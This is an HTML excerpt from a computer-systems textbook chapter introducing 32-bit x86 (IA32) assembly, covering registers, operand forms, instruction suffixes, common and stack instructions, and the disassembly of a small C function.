<html><head></head><body>
<h2 class="h2" id="ch08"><span epub:type="pagebreak" id="page_377"/><span class="big">8</span><br/>32-BIT X86 ASSEMBLY (IA32)</h2>&#13;
<div class="imagec"><img alt="image" src="../images/common.jpg"/></div>&#13;
<p class="noindents">In this chapter, we explore the Intel Architecture 32-bit (IA32) instruction set architecture. Recall from <a href="ch05.xhtml#ch05">Chapter 5</a> that an instruction set architecture, or ISA, defines the set of instructions and binary encodings of a machine-level program. To run the examples in this chapter, you will need access to a machine with an x86 processor or a compiler that can create 32-bit executables. The term “x86” is often used synonymously with the IA32 architecture. The x86 architecture, and its 64-bit variant x86-64, are ubiquitous in modern computers.</p>&#13;
<p class="indent">Very few modern machines have 32-bit processors; most Intel and AMD systems produced since 2007 have 64-bit processors. To check what type of processor you have, use the <span class="literal">uname -p</span> command:</p>&#13;
<p class="programs">$ <span class="codestrong1">uname -p</span><br/>&#13;
i686</p>&#13;
<p class="indent">If typing <span class="literal">uname -p</span> returns either <span class="literal">i686</span> or <span class="literal">i386</span>, your system has a 32-bit processor. However, if the <span class="literal">uname -p</span> command returns <span class="literal">x86_64</span>, your system has a <span epub:type="pagebreak" id="page_378"/>newer 64-bit processor. Note that because x86-64 is an <em>extension</em> of the older IA32 ISA, virtually all 64-bit systems contain a 32-bit subsystem that allows the execution of 32-bit executables.</p>&#13;
<p class="indent">If you have a 64-bit Linux system, additional packages are sometimes required to allow users to create 32-bit executables, like we will be doing in this chapter. For example, on an Ubuntu machine you will need to install 32-bit development libraries and additional packages to augment GCC with cross-compiling features:</p>&#13;
<p class="programs">$ <span class="codestrong1">sudo apt-get install libc6-dev-i386 gcc-multilib</span></p>&#13;
<div class="g-box">&#13;
<p class="box-title">x86 SYNTAX BRANCHES</p>&#13;
<p class="noindentt">x86 architectures typically follow one of two different syntax branches. Unix machines commonly use the AT&amp;T syntax, given that Unix was developed at AT&amp;T Bell Labs. The corresponding assembler is GNU Assembler (GAS). Since we use GCC for most examples in this book, we cover AT&amp;T syntax in this chapter. Windows machines commonly use Intel syntax, which is used by Microsoft’s Macro Assembler (MASM). The Netwide Assembler (NASM) is an example of a Linux assembler that uses Intel syntax. The argument regarding the superiority of one syntax over the other is one of the “holy wars” of the discipline. However, there is value in being familiar with both syntaxes, as a programmer may encounter either in various circumstances.</p>&#13;
</div>&#13;
<h3 class="h3" id="lev1_62">8.1 Diving into Assembly: Basics</h3>&#13;
<p class="noindent">For a first look at assembly, we modify the <span class="literal">adder</span> function from <a href="ch06.xhtml#ch06">Chapter 6</a> to simplify its behavior. Here’s the modified function (<span class="literal">adder2</span>):</p>&#13;
<p class="margnote">modified.c</p>&#13;
<p class="programs">#include &lt;stdio.h&gt;<br/>&#13;
<br/>&#13;
//adds two to an integer and returns the result<br/>&#13;
int adder2(int a) {<br/>&#13;
    return a + 2;<br/>&#13;
}<br/>&#13;
<br/>&#13;
int main(){<br/>&#13;
    int x = 40;<br/>&#13;
    x = adder2(x);<br/>&#13;
    printf("x is: %d\n", x);<br/>&#13;
    return 0;<br/>&#13;
}</p>&#13;
<p class="indent">To compile this code, use the following command:</p>&#13;
<p class="programs">$ <span class="codestrong1">gcc -m32 -o modified modified.c</span></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_379"/>The <span class="literal">-m32</span> flag tells GCC to compile the code to a 32-bit executable. Forgetting to include this flag may result in assembly that is wildly different from the examples shown in this chapter; by default, GCC compiles to x86-64 assembly, the 64-bit variant of x86. However, virtually all 64-bit architectures have a 32-bit operating mode for backward compatibility. This chapter covers IA32; other chapters cover x86-64 and ARM. Despite its age, IA32 is still extremely useful for understanding how programs work and how to optimize code.</p>&#13;
<p class="indent">Next, let’s view the corresponding assembly of this code by typing the following command:</p>&#13;
<p class="programs">$ <span class="codestrong1">objdump -d modified &gt; output</span><br/>&#13;
$ <span class="codestrong1">less output</span></p>&#13;
<p class="indent">Search for the code snippet associated with <span class="literal">adder2</span> by typing <span class="literal">/adder2</span> while examining the file <span class="literal">output</span> using <span class="literal">less</span>. The section associated with <span class="literal">adder2</span> should look similar to the following:</p>&#13;
<p class="programs">0804840b &lt;adder2&gt;:<br/>&#13;
 804840b:       55                      push   %ebp<br/>&#13;
 804840c:       89 e5                   mov    %esp,%ebp<br/>&#13;
 804840e:       8b 45 08                mov    0x8(%ebp),%eax<br/>&#13;
 8048411:       83 c0 02                add    $0x2,%eax<br/>&#13;
 8048414:       5d                      pop    %ebp<br/>&#13;
 8048415:       c3                      ret</p>&#13;
<p class="line"><em>Assembly output for the adder2 function</em></p>&#13;
<p class="indent">Don’t worry if you don’t understand what’s going on just yet. We will cover assembly in greater detail in later sections. For now, we will study the structure of these individual instructions.</p>&#13;
<p class="indent">Each line in the preceding example contains an instruction’s address in program memory, the bytes corresponding to the instruction, and the plaintext representation of the instruction itself. For example, <span class="literal">55</span> is the machine code representation of the instruction <span class="literal">push %ebp</span>, and the instruction occurs at address 0x804840b in program memory.</p>&#13;
<p class="indent">It is important to note that a single line of C code often translates to multiple instructions in assembly. The operation <span class="literal">a + 2</span> is represented by the two instructions <span class="literal">mov 0x8(%ebp),%eax</span> and <span class="literal">add $0x2,%eax</span>.</p>&#13;
<p class="note"><strong><span class="black">Warning</span> YOUR ASSEMBLY MAY LOOK DIFFERENT!</strong></p>&#13;
<p class="note-w">If you are compiling your code along with us, you may notice that some of your assembly examples look different from what is shown in this book. The precise assembly instructions that are output by any compiler depend on that compiler’s version and the underlying operating system. Most of the assembly examples in this book were generated on systems running Ubuntu or Red Hat Enterprise Linux (RHEL).</p>&#13;
<p class="note-w"><span epub:type="pagebreak" id="page_380"/>In the examples that follow, we do not use any optimization flags. For example, we compile any example file (<span class="literal">example.c</span>) using the command <span class="literal">gcc</span> <span class="literal">-m32 -o example example.c</span>. Consequently, there are many seemingly redundant instructions in the examples that follow. Remember that the compiler is not “smart”—it simply follows a series of rules to translate human-readable code into machine language. During this translation process, it is not uncommon for some redundancy to occur. Optimizing compilers remove many of these redundancies during optimization, which is covered in <a href="ch12.xhtml#ch12">Chapter 12</a>.</p>&#13;
<h4 class="h4" id="lev2_139">8.1.1 Registers</h4>&#13;
<p class="noindent">Recall that a <em>register</em> is a word-sized storage unit located directly on the CPU. There may be separate registers for data, instructions, and addresses. For example, the Intel CPU has a total of eight registers for storing 32-bit data: <span class="literal">%eax</span>, <span class="literal">%ebx</span>, <span class="literal">%ecx</span>, <span class="literal">%edx</span>, <span class="literal">%edi</span>, <span class="literal">%esi</span>, <span class="literal">%esp</span>, and <span class="literal">%ebp</span>.</p>&#13;
<p class="indent">Programs can read from or write to all eight of these registers. The first six registers all hold general-purpose data, whereas the last two are typically reserved by the compiler to hold address data. While a program may interpret a general-purpose register’s contents as integers or as addresses, the register itself makes no distinction. The last two registers (<span class="literal">%esp</span> and <span class="literal">%ebp</span>) are known as the <em>stack pointer</em> and the <em>frame pointer</em>, respectively. The compiler reserves these registers for operations that maintain the layout of the program stack. Typically, <span class="literal">%esp</span> points to the top of the program stack, whereas <span class="literal">%ebp</span> points to the base of the current stack frame. We discuss stack frames and these two registers in greater detail in our discussion on functions (see “Functions in Assembly” on <a href="ch07.xhtml#lev1_55">page 326</a>).</p>&#13;
<p class="indent">The last register worth mentioning is <span class="literal">%eip</span> or the <em>instruction pointer</em>, sometimes called the <em>program counter</em> (PC). It points to the next instruction to be executed by the CPU. Unlike the eight registers mentioned previously, programs cannot write directly to register <span class="literal">%eip</span>.</p>&#13;
<h4 class="h4" id="lev2_140">8.1.2 Advanced Register Notation</h4>&#13;
<p class="noindent">For the first six registers mentioned, the ISA provides a mechanism to access the lower 16 bits of each register. The ISA also provides a separate mechanism to access the 8-bit components of the lower 16 bits of the first four of these registers. <a href="ch08.xhtml#ch8tab1">Table 8-1</a> lists each of the six registers and the ISA mechanisms (if available) to access their component bytes.</p>&#13;
<p class="tabcap" id="ch8tab1"><span epub:type="pagebreak" id="page_381"/><strong>Table 8-1:</strong> x86 Registers and Mechanisms for Accessing Lower Bytes</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:25%"/>&#13;
<col style="width:25%"/>&#13;
<col style="width:25%"/>&#13;
<col style="width:25%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>32-bit Register</strong><br/><strong>(Bits 31–0)</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Lower 16 Bits</strong><br/><strong>(Bits 15–0)</strong></p></td>&#13;
<td style="vertical-align: bottom"><p class="tab"><strong>(Bits 15–8)</strong></p></td>&#13;
<td style="vertical-align: bottom"><p class="tab"><strong>(Bits 7–0)</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ah</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%al</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ebx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%bx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%bh</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%bl</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ecx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%cx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ch</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%cl</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%edx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%dx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%dh</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%dl</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%edi</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%di</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%esi</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%si</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">The lower 16 bits for any of the aforementioned registers can be accessed by referencing the last two letters in the register’s name. For example, use <span class="literal">%ax</span> to access the lower 16 bits of <span class="literal">%eax</span>.</p>&#13;
<p class="indent">The <em>higher</em> and <em>lower</em> bytes within the lower 16 bits of the first four listed registers can be accessed by taking the last two letters of the register name and replacing the last letter with either an <span class="literal">h</span> (for <em>higher</em>) or an <span class="literal">l</span> (for <em>lower</em>) depending on which byte is desired. For example, <span class="literal">%al</span> references the lower eight bits of register <span class="literal">%ax</span>, whereas <span class="literal">%ah</span> references the higher eight bits of register <span class="literal">%ax</span>. These eight-bit registers are commonly used by the compiler for storing single-byte values for certain operations, such as bitwise shifts (a 32-bit register cannot be shifted more than 32 places and the number 32 requires only a single byte of storage). In general, the compiler will use the smallest component register needed to complete an operation.</p>&#13;
<h4 class="h4" id="lev2_141">8.1.3 Instruction Structure</h4>&#13;
<p class="noindent">Each instruction consists of an operation code (or <em>opcode</em>) that specifies what it does, and one or more <em>operands</em> that tell the instruction how to do it. For example, the instruction <span class="literal">add $0x2,%eax</span> has the opcode <span class="literal">add</span> and the operands <span class="literal">$0x2</span> and <span class="literal">%eax</span>.</p>&#13;
<p class="indent">Each operand corresponds to a source or destination location for a specific operation. There are multiple types of operands:</p>&#13;
<ul>&#13;
<li class="noindent"><em>Constant</em> (<em>literal</em>) values are preceded by the <span class="literal">$</span> sign. For example, in the instruction <span class="literal">add $0x2,%eax</span>, <span class="literal">$0x2</span> is a literal value that corresponds to the hexadecimal value 0x2.</li>&#13;
<li class="noindent"><em>Register</em> forms refer to individual registers. The instruction <span class="literal">add</span> <span class="literal">$0x2,</span> <span class="literal">%eax</span> specifies register <span class="literal">%eax</span> as the destination location where the result of the <span class="literal">add</span> operation will be stored.</li>&#13;
<li class="noindent"><em>Memory</em> forms correspond to some value inside main memory (RAM) and are commonly used for address lookups. Memory address forms can contain a combination of registers and constant values. For example, in the instruction <span class="literal">mov 0x8(%ebp),%eax</span>, the operand <span class="literal">0x8(%ebp)</span> is an example of a memory form. It loosely translates to “add 0x8 to the value in register <span class="literal">%ebp</span>, and then perform a memory lookup.” If this sounds like a pointer dereference, that’s because it is!</li>&#13;
</ul>&#13;
<h4 class="h4" id="lev2_142"><span epub:type="pagebreak" id="page_382"/>8.1.4 An Example with Operands</h4>&#13;
<p class="noindent">The best way to explain operands in detail is to present a quick example. Suppose that memory contains the following values:</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:50%"/>&#13;
<col style="width:50%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Address</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Value</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab">0x804</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0xCA</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab">0x808</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0xFD</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab">0x80c</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x12</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab">0x810</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x1E</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">Let’s also assume that the following registers contain values:</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:50%"/>&#13;
<col style="width:50%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Address</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Value</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x804</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ebx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x10</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ecx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x4</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%edx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x1</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">Then the operands in <a href="ch08.xhtml#ch8tab2">Table 8-2</a> evaluate to the values shown. Each row of the table matches an operand with its form (e.g., constant, register, memory), how it is translated, and its value. Note that the notation M[x] in this context denotes the value at the memory location specified by address x.</p>&#13;
<p class="tabcap" id="ch8tab2"><strong>Table 8-2:</strong> Example Operands</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:50%"/>&#13;
<col style="width:10%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Operand</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Form</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Value</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ecx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Register</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ecx</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x4</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">(%eax)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Memory</p></td>&#13;
<td style="vertical-align: top"><p class="tab">M[<span class="literal">%eax</span>] or M[0x804]</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0xCA</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">$0x808</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Constant</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x808</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x808</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">0x808</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Memory</p></td>&#13;
<td style="vertical-align: top"><p class="tab">M[0x808]</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0xFD</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">0x8(%eax)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Memory</p></td>&#13;
<td style="vertical-align: top"><p class="tab">M[<span class="literal">%eax</span> + 8] or M[0x80c]</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x12</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">(%eax, %ecx)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Memory</p></td>&#13;
<td style="vertical-align: top"><p class="tab">M[<span class="literal">%eax</span> + <span class="literal">%ecx</span>] or M[0x808]</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0xFD</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">0x4(%eax, %ecx)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Memory</p></td>&#13;
<td style="vertical-align: top"><p class="tab">M[<span class="literal">%eax</span> + <span class="literal">%ecx</span> + 4] or M[0x80c]</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x12</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">0x800(,%edx,4)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Memory</p></td>&#13;
<td style="vertical-align: top"><p class="tab">M[0x800 + <span class="literal">%edx</span>×4] or M[0x804]</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0xCA</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">(%eax, %edx, 8)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Memory</p></td>&#13;
<td style="vertical-align: top"><p class="tab">M[<span class="literal">%eax</span> + <span class="literal">%edx</span>×8] or M[0x80c]</p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x12</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">In <a href="ch08.xhtml#ch8tab2">Table 8-2</a>, the notation <span class="literal">%ecx</span> indicates the value stored in register <span class="literal">%ecx</span>. In contrast, M[<span class="literal">%eax</span>] indicates that the value inside <span class="literal">%eax</span> should be treated as an address, and to dereference (look up) the value at that address. Therefore, the operand <span class="literal">(%eax)</span> corresponds to M[0x804], which corresponds to the value 0xCA.</p>&#13;
<p class="indent">A few important notes before continuing. While <a href="ch08.xhtml#ch8tab2">Table 8-2</a> shows many valid operand forms, not all forms can be used interchangeably in all circumstances.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_383"/>Specifically:</p>&#13;
<ul>&#13;
<li class="noindent">Constant forms cannot serve as destination operands.</li>&#13;
<li class="noindent">Memory forms cannot serve as <em>both</em> the source and destination operand in a single instruction.</li>&#13;
<li class="noindent">In cases of scaling operations (refer to the last two operands shown in <a href="ch08.xhtml#ch8tab2">Table 8-2</a>), the scaling factor must be one of 1, 2, 4, or 8.</li>&#13;
</ul>&#13;
<p class="indent"><a href="ch08.xhtml#ch8tab2">Table 8-2</a> is provided as a reference; however, understanding key operand forms will help improve the reader’s speed in parsing assembly language.</p>&#13;
<h4 class="h4" id="lev2_143">8.1.5 Instruction Suffixes</h4>&#13;
<p class="noindent">In several cases in upcoming examples, common and arithmetic instructions have a suffix that indicates the <em>size</em> (associated with the <em>type</em>) of the data being operated on at the code level. The compiler automatically translates code to instructions with the appropriate suffix. <a href="ch08.xhtml#ch8tab3">Table 8-3</a> shows the common suffixes for x86 instructions.</p>&#13;
<p class="tabcap" id="ch8tab3"><strong>Table 8-3:</strong> Example Instruction Suffixes</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:30%"/>&#13;
<col style="width:50%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab-c"><strong>Suffix</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>C Type</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab-c"><strong>Size (bytes)</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab-c">b</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">char</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab-c">1</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab-c">w</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">short</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab-c">2</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab-c">l</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">int</span>, <span class="literal">long</span>, <span class="literal">unsigned</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab-c">4</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">Note that instructions involved with conditional execution have different suffixes based on the evaluated condition. We cover instructions associated with conditional instructions in “Conditional Control and Loops” on <a href="ch07.xhtml#lev1_54">page 310</a>.</p>&#13;
<h3 class="h3" id="lev1_63">8.2 Common Instructions</h3>&#13;
<p class="noindent">In this section, we discuss several common x86 assembly instructions. <a href="ch08.xhtml#ch8tab4">Table 8-4</a> lists the most foundational instructions in x86 assembly.</p>&#13;
<p class="tabcap" id="ch8tab4"><strong>Table 8-4:</strong> Most Common Instructions</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:20%"/>&#13;
<col style="width:60%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instruction</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">mov S,D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">S → D</p></td>&#13;
<td style="vertical-align: top"><p class="tab">(copies value of S into D)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">add S,D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">S + D → D</p></td>&#13;
<td style="vertical-align: top"><p class="tab">(adds S to D and stores result in D)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">sub S,D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">D – S → D</p></td>&#13;
<td style="vertical-align: top"><p class="tab">(subtracts S <em>from</em> D and stores result in D)</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">Therefore, the sequence of instructions</p>&#13;
<p class="programs">&#13;
mov    0x8(%ebp),%eax<br/>&#13;
add    $0x2,%eax</p>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_384"/>translates to:</p>&#13;
<ul>&#13;
<li class="noindent">Copy the value at location <span class="literal">%ebp</span> + 0x8 in <em>memory</em> (or M[<span class="literal">%ebp</span> + 0x8]) to register <span class="literal">%eax</span>.</li>&#13;
<li class="noindent">Add the value 0x2 to register <span class="literal">%eax</span>, and store the result in register <span class="literal">%eax</span>.</li>&#13;
</ul>&#13;
<p class="indent">The three instructions shown in <a href="ch08.xhtml#ch8tab4">Table 8-4</a> also form the building blocks for instructions that maintain the organization of the program stack (i.e., the <em>call stack</em>). Recall that registers <span class="literal">%ebp</span> and <span class="literal">%esp</span> refer to the <em>frame</em> pointer and <em>stack</em> pointer, respectively, and are reserved by the compiler for call stack management. Recall from our earlier discussion on program memory in “Parts of Program Memory and Scope” on <a href="ch02.xhtml#lev1_9">page 64</a> that the call stack stores local variables and parameters and helps the program track its own execution (see <a href="ch08.xhtml#ch8fig1">Figure 8-1</a>).</p>&#13;
<div class="imagec" id="ch8fig1"><img alt="image" src="../images/08fig01.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-1: The parts of a program’s address space</em></p>&#13;
<p class="indent">On IA32 systems, the execution stack grows toward <em>lower</em> addresses. Like all stack data structures, operations occur at the “top” of the stack. The x86 ISA provides two instructions (<a href="ch08.xhtml#ch8tab5">Table 8-5</a>) to simplify call stack management.</p>&#13;
<p class="tabcap" id="ch8tab5"><span epub:type="pagebreak" id="page_385"/><strong>Table 8-5:</strong> Stack Management Instructions</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:80%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instruction</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">push S</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Pushes a copy of S onto the top of the stack. Equivalent to:</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">sub $4,%esp</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">mov S,(%esp)</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">pop D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Pops the top element off the stack and places it in location D.</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab">Equivalent to:</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">mov (%esp),D</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">add $4,%esp</span></p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">Notice that while the three instructions in <a href="ch08.xhtml#ch8tab4">Table 8-4</a> require two operands, the <span class="literal">push</span> and <span class="literal">pop</span> instructions in <a href="ch08.xhtml#ch8tab5">Table 8-5</a> require only one operand apiece.</p>&#13;
<h4 class="h4" id="lev2_144">8.2.1 Putting It All Together: A More Concrete Example</h4>&#13;
<p class="noindent">Let’s take a closer look at the <span class="literal">adder2</span> function.</p>&#13;
<p class="programs">//adds two to an integer and returns the result<br/>&#13;
int adder2(int a) {<br/>&#13;
    return a + 2;<br/>&#13;
}</p>&#13;
<p class="noindent">and its corresponding assembly code:</p>&#13;
<p class="programs">&#13;
0804840b &lt;adder2&gt;:<br/>&#13;
 804840b:       55                      push   %ebp<br/>&#13;
 804840c:       89 e5                   mov    %esp,%ebp<br/>&#13;
 804840e:       8b 45 08                mov    0x8(%ebp),%eax<br/>&#13;
 8048411:       83 c0 02                add    $0x2,%eax<br/>&#13;
 8048414:       5d                      pop    %ebp<br/>&#13;
 8048415:       c3                      ret<br/></p>&#13;
<p class="indent">The assembly code consists of a <span class="literal">push</span> instruction, followed by a couple of <span class="literal">mov</span> instructions, an <span class="literal">add</span> instruction, a <span class="literal">pop</span> instruction, and finally a <span class="literal">ret</span> instruction. To understand how the CPU executes this set of instructions, we need to revisit the structure of program memory (see “Parts of Program Memory and Scope” on <a href="ch02.xhtml#lev1_9">page 64</a>). Recall that every time a program executes, the operating system allocates the new program’s address space (also known as <em>virtual memory</em>). Virtual memory and the related concept of processes are covered in greater detail in <a href="ch13.xhtml#ch13">Chapter 13</a>; for now, it suffices to think of a process as the abstraction of a running program and virtual memory as the memory that is allocated to a single process. Every process has its own region of memory called the <em>call stack</em>. Keep in mind that the call stack is located in process/virtual memory, unlike registers (which are located on the CPU).</p>&#13;
<p class="indent"><a href="ch08.xhtml#ch8fig2">Figure 8-2</a> depicts a sample state of the call stack and registers prior to the execution of the <span class="literal">adder2</span> function.</p>&#13;
<div class="imagec" id="ch8fig2"><span epub:type="pagebreak" id="page_386"/><img alt="image" src="../images/08fig02.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-2: Execution stack prior to execution</em></p>&#13;
